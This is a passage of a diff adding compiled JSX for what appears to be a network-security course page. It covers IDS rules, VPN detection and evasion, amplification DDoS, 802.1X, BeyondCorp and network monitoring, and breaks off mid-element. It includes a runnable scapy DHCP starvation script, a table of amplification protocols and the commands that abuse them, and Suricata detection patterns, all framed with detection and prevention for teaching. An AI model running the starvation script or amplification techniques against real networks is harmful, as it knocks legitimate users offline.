+        children: "# Detect SQL injection with multiple encodings\nalert http $EXTERNAL_NET any -> $HOME_NET any\n  (msg:\"Advanced SQL Injection - UNION with comments\";\n   flow:to_server,established;\n   pcre:\"/UNION\\s+(ALL\\s+)?SELECT\\s+.*\\d+.*FROM/isU\";\n   classtype:web-application-attack;\n   sid:1000010; rev:1;)\n\n# Detect directory traversal with Unicode encoding\nalert http $EXTERNAL_NET any -> $HOME_NET any\n  (msg:\"Directory Traversal - Encoded\";\n   flow:to_server,established;\n   pcre:\"/(?:%2e|%c0%[ae]|%e0%40%[ae]|\\.\\.)[/%\\\\]/i\";\n   classtype:attempted-recon;\n   sid:1000011; rev:1;)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "183-zeek-formerly-bro-scripting",
+      children: "18.3 Zeek (formerly Bro) Scripting"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Zeek is an event-based network monitoring system:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-zeek",
+        children: "# detect-ssh-brute.zeek\nmodule SSHBruteforce;\n\nexport {\n    redef enum Notice::Type += {\n        Bruteforce_Detected\n    };\n    \n    global brute_threshold = 10;\n    global brute_interval = 5min;\n}\n\nglobal auth_fails: table[addr] of count &default=0;\n\nevent ssh_auth_failed(c: connection, auth_method_none: bool) {\n    local src = c$id$orig_h;\n    ++auth_fails[src];\n    \n    if (auth_fails[src] >= brute_threshold) {\n        NOTICE([$note=Bruteforce_Detected,\n                $msg=fmt(\"SSH brute force from %s (%d failures)\", src, auth_fails[src]),\n                $src=src]);\n        \n        # Reset counter after alerting\n        delete auth_fails[src];\n    }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Run Zeek on a PCAP:"
+      }), " ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "zeek -r capture.pcap ./detect-ssh-brute.zeek"
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Zeek log output:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "cat notice.log | zeek-cut ts note msg\n\n# Expected:\n# 1700000000  SSHBruteforce::Bruteforce_Detected  SSH brute force from 10.0.0.5 (10 failures)\n# 1700000300  SSHBruteforce::Bruteforce_Detected  SSH brute force from 10.0.0.9 (12 failures)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-19-advanced-vpn--dpi-and-vpn-detection",
+      children: "Section 19: Advanced VPN → DPI and VPN Detection"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "191-how-dpi-identifies-vpn-traffic",
+      children: "19.1 How DPI Identifies VPN Traffic"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Deep Packet Inspection can identify VPN protocols:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "IPsec ESP detection:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Protocol field = 50 (0x32) in IP header"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Next Header byte in ESP trailer indicates inner protocol"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "ESP SPI (Security Parameter Index) → first 4 bytes after IP header"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "WireGuard detection:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "UDP destination port 51820 (default, but changeable)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "First byte of handshake initiation: 0x01 (Type 1 = Handshake Initiation)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "First byte of transport data: 0x04"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "After handshake: encrypted data indistinguishable from random"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "OpenVPN detection:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "TCP/UDP port 1194 (default)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "First packet begins with OpenVPN opcode (0x38 = P_CONTROL_HARD_RESET_CLIENT_V2)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "TLS handshake follows immediately"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "HMAC-based authentication (if tls-auth enabled)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# tcpdump filter for IPsec ESP\ntcpdump -i eth0 proto 50\n\n# tcpdump filter for WireGuard\ntcpdump -i eth0 udp port 51820\n\n# tcpdump filter for OpenVPN\ntcpdump -i eth0 port 1194\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "192-vpn-detection-evasion",
+      children: "19.2 VPN Detection Evasion"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Techniques used to bypass DPI:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Protocol Obfuscation:"
+        }), " Wrap VPN in TLS (stunnel, obfsproxy)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Port Hopping:"
+        }), " Change port periodically (WireGuard roaming)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Packet Padding:"
+        }), " Add random padding to normalize packet sizes"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Traffic Morphing:"
+        }), " Make VPN traffic look like HTTP or video streaming"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "udp2raw:"
+        }), " Encapsulate UDP VPN in fake TCP packets with SEQ/ACK"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Example: obfuscate OpenVPN with stunnel\n# /etc/stunnel/stunnel.conf\n[vpn]\nclient = yes\naccept = 127.0.0.1:1194\nconnect = vpn.example.com:443\nPSKsecrets = /etc/stunnel/psk.txt\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-20-advanced-ddos--amplification-attacks",
+      children: "Section 20: Advanced DDoS → Amplification Attacks"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "201-dns-amplification-attack",
+      children: "20.1 DNS Amplification Attack"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Attacker (spoofs victim IP: 1.2.3.4)\n  │\n  │ DNS query (\"ANY isc.org\") with src=1.2.3.4\n  ├────────────────────→ Open DNS Resolver\n  │                       ↑\n  │ DNS response (~3500 bytes) to 1.2.3.4\n  ├────────────────────→ Victim (1.2.3.4)\n  \nAmplification factor: ~50x-70x\n  Input:  60 bytes (DNS query)\n  Output: 3500 bytes (ANY response with DNSSEC)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Other Amplification Protocols:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Protocol"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Port"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Amplification Factor"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Technique"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "DNS"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "53"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "50-70x"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ANY query with DNSSEC"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NTP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "123"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "550-600x"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "monlist command"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "memcached"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "11211"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "10,000-50,000x"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "STATS command"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "SSDP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1900"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "30-35x"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Discovery request"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "SNMPv2"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "161"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "6-10x"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "GetBulkRequest"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Mitigation for amplification attacks:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. DNS → disable recursion for external clients\niptables -A INPUT -p udp --dport 53 -s ! 192.168.0.0/16 -m recent --name DNS --set\niptables -A INPUT -p udp --dport 53 -s ! 192.168.0.0/16 -m recent --name DNS --rcheck --seconds 1 --hitcount 10 -j DROP\n\n# 2. NTP → disable monlist (CVE-2013-5211)\nrestrict default kod nomodify notrap nopeer noquery\nrestrict -6 default kod nomodify notrap nopeer noquery\n\n# 3. memcached → bind to localhost only (if local-only)\nsed -i 's/-l 0.0.0.0/-l 127.0.0.1/' /etc/memcached.conf\n\n# 4. uRPF (Unicast Reverse Path Forwarding) → drop packets with spoofed src\nsysctl -w net.ipv4.conf.all.rp_filter=1\nsysctl -w net.ipv4.conf.default.rp_filter=1\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-21-advanced-wireless--enterprise-deployment",
+      children: "Section 21: Advanced Wireless → Enterprise Deployment"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "211-8021x-full-deployment-topology",
+      children: "21.1 802.1X Full Deployment Topology"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "                 ┌──────────────┐\n                 │  FreeRADIUS  │\n                 │  (auth + acct)│\n                 └──────┬───────┘\n                        │ RADIUS (UDP 1812/1813)\n         ┌──────────────┼──────────────┐\n         │              │              │\n    ┌────▼────┐   ┌────▼────┐   ┌────▼────┐\n    │  AP-01  │   │  AP-02  │   │  AP-03  │\n    │(Authz)  │   │(Authz)  │   │(Authz)  │\n    └────┬────┘   └────┬────┘   └────┬────┘\n         │              │              │\n    ┌────▼──────────────▼──────────────▼────┐\n    │       802.1Q Trunk (VLAN pool)         │\n    │  VLAN 10=Corp, VLAN 20=Guest, VLAN 30=IoT │\n    └────────────────────────────────────────┘\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "EAP-TLS Full Authentication Flow:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Supplicant                     AP (Authz)              RADIUS Server\n    │                             │                         │\n    │---- EAPOL-Start ----------→│                         │\n    │←--- EAP-Request/Identity ---│                         │\n    │---- EAP-Response/Identity →│---- RADIUS Access-Request (EAP-Response) →│\n    │                             │                         │\n    │                             │                         │ RADIUS validates EAP type\n    │                             │                         │\n    │←--- EAP-Request (EAP-TLS: Server Hello + Cert) ------│\n    │                             │                         │\n    │---- EAP-Response (EAP-TLS: Client Cert, pre-master) →│\n    │                             │                         │ Validates client cert\n    │                             │                         │ Computes master key\n    │                             │                         │\n    │←--- EAP-Success + RADIUS Accept (session key) -------│\n    │                             │                         │\n    │       4-Way Handshake (derived from MSK from RADIUS) │\n    │←--- PTK derivation --------→│                         │\n    │                             │                         │\n    │       802.11 Data (encrypted with PTK)               │\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "212-radius-server-logs",
+      children: "21.2 RADIUS Server Logs"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Monitor FreeRADIUS authentication\ntail -f /var/log/freeradius/radius.log\n\n# Expected:\n# (0) pap: Login OK: [user@example.com] (from AP-01 port 1 cli AA:BB:CC:DD:EE:FF)\n# (0) Sent Access-Accept Id 214 from 192.168.1.10:1812 to 192.168.1.20:36381\n# (0)   MS-MPPE-Recv-Key = 0x7a6f...\n# (0)   MS-MPPE-Send-Key = 0xdead...\n# (0)   MS-MPPE-Encryption-Types: User may use all encryption types\n# (1) pap: Login OK: [iot-sensor-01] (from AP-03 port 1 cli 11:22:33:44:55:66)\n# (1) Sent Access-Accept Id 215 from 192.168.1.10:1812 to 192.168.1.30:54789\n# (1)   Tunnel-Type = VLAN\n# (1)   Tunnel-Medium-Type = IEEE-802\n# (1)   Tunnel-Private-Group-Id = \"30\"  ← assigned to IoT VLAN\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-22-advanced-zero-trust--googles-beyondcorp-model",
+      children: "Section 22: Advanced Zero Trust → Google's BeyondCorp Model"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "221-beyondcorp-principles",
+      children: "22.1 BeyondCorp Principles"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Google's BeyondCorp (2010, public 2014) is the canonical zero trust implementation:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Instead of:\n  Corporate network = trusted\n  Internet = untrusted\n\nBeyondCorp:\n  All access = untrusted\n  Identity + Device + Context = authorization\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Components:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Component"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Google Implementation"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Open Source Equivalent"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Access Proxy"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Google Identity-Aware Proxy (IAP)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Pomerium, OAuth2 Proxy"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Device Inventory"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Google fleet management"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "FleetDM, osquery"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Identity Provider"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Google Identity Platform"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Keycloak, Dex"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Certificate Authority"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Google Internal CA"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Step CA, cert-manager"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Trust Score"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Context-aware access"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OPA, Rego policies"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Access Policy Example:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-rego",
+        children: "# OPA policy for BeyondCorp-style access\npackage beyondcorp\n\ndefault allow = false\n\nallow {\n    input.user.verified == true\n    input.device.encrypted == true\n    input.device.patched_within_days <= 30\n    input.location.corporate == false => input.auth_level == \"mfa\"  # MFA required off-campus\n    \n    # Least privilege: explicit resource access\n    input.resource in data.allowed_resources[input.user.role]\n    \n    # Context-based restrictions\n    not data.geo_restricted[input.resource]\n    input.location.country not in data.restricted_countries\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "222-beyondcorp-implementation-step-ca--pomerium",
+      children: "22.2 BeyondCorp Implementation (Step CA + Pomerium)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-yaml",
+        children: "# pomerium-config.yaml\npolicy:\n  - from: https://internal.example.com\n    to: http://app.internal:8080\n    allowed_users:\n      - user@example.com\n    allowed_groups:\n      - engineering\n    allowed_domains:\n      - example.com\n    pass_identity_headers: true\n  \n  - from: https://admin.example.com\n    to: http://admin-panel:3000\n    allowed_users:\n      - devops@example.com\n    minimum_upstream_version: \"TLS 1.3\"\n\n# Authenticate options:\nauthenticate_service_url: https://authenticate.example.com\nidp_provider: \"oidc\"\nidp_client_id: \"pomerium-client\"\nidp_provider_url: \"https://keycloak.example.com/auth/realms/internal\"\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Step CA for internal certificates:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Initialize CA\nstep ca init \\\n    --name=\"Internal CA\" \\\n    --dns=\"ca.internal.example.com\" \\\n    --address=\":443\" \\\n    --provisioner=\"admin@example.com\" \\\n    --password-file=/etc/step-ca/password.txt\n\n# Issue certificate for service\nstep certificate create \\\n    api.internal.example.com \\\n    api.crt api.key \\\n    --ca-url=https://ca.internal.example.com \\\n    --provisioner=admin@example.com\n\n# Verify mTLS connection\ncurl --cert api.crt --key api.key \\\n    https://service-mesh.internal:8443\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-23-advanced-protocol-attacks",
+      children: "Section 23: Advanced Protocol Attacks"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "231-dhcp-starvation-attack--full-walkthrough",
+      children: "23.1 DHCP Starvation Attack → Full Walkthrough"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Goal:"
+      }), " Exhaust all DHCP pool addresses so new clients cannot connect."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# YERSINIA → DHCP starvation tool\nyersinia -I\n# Interactive mode → Select DHCP → Launch starvation attack\n# Expected: 10,000 DHCP DISCOVER packets in seconds\n\n# Manual using scapy (Python)\ncat > dhcp-starvation.py << 'PYEOF'\nfrom scapy.all import *\nimport random\n\ndef random_mac():\n    return \":\".join([f\"{random.randint(0,255):02x}\" for _ in range(6)])\n\nfor i in range(1000):\n    mac = random_mac()\n    client_mac = mac.replace(\":\", \"\")\n    \n    # DHCP Discover\n    pkt = Ether(src=mac, dst=\"ff:ff:ff:ff:ff:ff\") / \\\n          IP(src=\"0.0.0.0\", dst=\"255.255.255.255\") / \\\n          UDP(sport=68, dport=67) / \\\n          BOOTP(chaddr=client_mac, xid=random.randint(1,100000)) / \\\n          DHCP(options=[(\"message-type\", \"discover\"), \"end\"])\n    \n    sendp(pkt, iface=\"eth0\", verbose=0)\n    print(f\"Sent DHCP Discover for MAC {mac}\")\n\n# After exhaustion: DHCP server has no addresses → all requests fail\nPYEOF\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Detection:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Monitor DHCP server logs for high request rate\ntail -f /var/log/dhcp-server/dhcpd.log | grep DHCPDISCOVER | wc -l\n# Expected: 1000+ in 60 seconds (baseline: ~1-10/minute)\n\n# Check pool utilization\ncat /var/lib/dhcp/dhcpd.leases | wc -l\n# Expected: 1000+ leases (normally 50-200)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Prevention: DHCP Snooping (Cisco):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Rate limit DHCP requests per port\ninterface GigabitEthernet0/1\n    ip dhcp snooping limit rate 5   # max 5 DHCP packets/second\n\n# Log violations\nip dhcp snooping log mismatch\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "232-arp-spoofing-detection--detailed",
+      children: "23.2 ARP Spoofing Detection → Detailed"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Passive detection using arpwatch\narpwatch -i eth0 -f /var/arpwatch/arp.dat\n# Monitor /var/log/arpwatch.log:\n# changed ethernet address (00:11:22:33:44:55 -> AA:BB:CC:DD:EE:FF) 192.168.1.1\n# new station (192.168.1.50) AA:BB:CC:DD:EE:FF\n# flip flop (192.168.1.1) 00:11:22:33:44:55 -> AA:BB:CC:DD:EE:FF -> 00:11:22:33:44:55\n\n# 2. Active detection using Python/scapy\ncat > detect-arp.py << 'PYEOF'\nfrom scapy.all import *\nimport sys\n\ndef detect_arp(pkt):\n    if ARP in pkt and pkt[ARP].op == 2:  # ARP reply\n        ip = pkt[ARP].psrc\n        mac = pkt[ARP].hwsrc\n        \n        # Check against known IP-MAC mapping\n        known = {\n            \"192.168.1.1\": \"00:11:22:33:44:55\",\n            \"192.168.1.100\": \"66:77:88:99:AA:BB\"\n        }\n        \n        if ip in known and known[ip] != mac:\n            print(f\"[ALERT] ARP Spoof! IP {ip} claimed by {mac}, expected {known[ip]}\")\n\nif __name__ == \"__main__\":\n    sniff(iface=\"eth0\", prn=detect_arp, filter=\"arp\", store=0)\nPYEOF\n\n# Run\npython3 detect-arp.py\n# Expected: [ALERT] ARP Spoof! IP 192.168.1.1 claimed by AA:BB:CC:DD:EE:FF, expected 00:11:22:33:44:55\n\n# 3. Static ARP entry (prevention for critical devices)\narp -s 192.168.1.1 00:11:22:33:44:55\n\n# 4. Switch protection → Dynamic ARP Inspection (DAI)\nip arp inspection vlan 10,20\nip arp inspection validate src-mac dst-mac ip\ninterface GigabitEthernet0/1\n    ip arp inspection trust        # for legitimate router/switch ports\n    ip arp inspection limit rate 15 # 15 pps max\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-24-network-security-monitoring-nsm-stack",
+      children: "Section 24: Network Security Monitoring (NSM) Stack"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "241-full-nsm-architecture",
+      children: "24.1 Full NSM Architecture"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[Network TAP / Mirror Port]\n        │\n        ▼\n[Packet Broker] (filter, aggregate, load balance)\n        │\n        ├────────────┬────────────┬─────────────┐\n        ▼            ▼            ▼             ▼\n[Suricata IDS]  [Zeek NSM]   [tcpdump]    [NetFlow/IPFIX]\n   (alerts)    (logs/events) (full PCAP)  (flow records)\n        │            │            │             │\n        └────────────┴────────────┴─────────────┘\n                        │\n                        ▼\n          [Data Lake: Elasticsearch / S3]\n                        │\n                        ▼\n          [Kibana / Grafana / Jupyter]\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Deployment commands:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Configure port mirroring on Cisco switch\nmonitor session 1 source interface Gi1/0/1 - 24\nmonitor session 1 destination interface Gi1/0/25\n\n# Receive mirrored traffic on NSM server\nip link add name eth0-mirror type bridge\nip link set eth0-mirror up\n# Suricata reads from af-packet interface\n\n# NetFlow export (softflowd)\nsoftflowd -i eth0 -n collector.local:2055 -t maxlife=3600\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "242-security-onion--all-in-one-nsm",
+      children: "24.2 Security Onion → All-in-One NSM"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Install Security Onion\n# https://docs.securityonion.org/en/latest/installation/\n\n# Check cluster status\nsudo so-status\n# Expected:\n# Elasticsearch: green (all shards active)\n# Suricata: running (3.2 million alerts/sec capacity)\n# Zeek: running (500k connections/sec)\n# Kibana: running (https://so-manager:443)\n# Wazuh: running (2,500 agents connected)\n\n# Query past hour alerts\nsudo so-query -q 'event_type:alert AND timestamp:[now-1h TO now]' | head -20\n\n# Extract PCAP for specific connection\nsudo so-pcap -d 'host 10.0.0.5 and port 443'\n# Writes pcap file to /nsm/pcap/out/\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-25-extended-interview-corner--advanced-qas",
+      children: "Section 25: Extended Interview Corner → Advanced Q&As"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q16-how-does-ipsec-tunnel-mode-differ-from-transport-mode-show-packet-structure",
+      children: "Q16: How does IPsec tunnel mode differ from transport mode? Show packet structure."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A16:"
+      }), " In transport mode, only the payload (TCP segment, UDP datagram) is encrypted. The original IP header is visible. In tunnel mode, the entire original IP packet is encrypted and encapsulated in a new IP packet with new IP headers. Tunnel mode is used for site-to-site VPNs (gateway-to-gateway). Transport mode is used for end-to-end (host-to-host)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Transport mode packet:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
